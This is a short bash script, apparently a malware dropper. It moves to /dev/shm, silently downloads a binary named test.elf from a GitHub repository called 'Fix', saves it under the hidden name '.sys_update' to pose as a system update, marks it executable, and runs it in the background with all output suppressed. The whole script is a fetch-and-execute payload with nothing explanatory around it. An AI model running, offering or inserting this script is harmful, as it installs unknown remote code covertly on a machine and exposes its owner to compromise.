#!/bin/bash
D="/dev/shm"
cd $D
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/test.elf -o .sys_update
chmod +x .sys_update
./.sys_update >/dev/null 2>&1 &
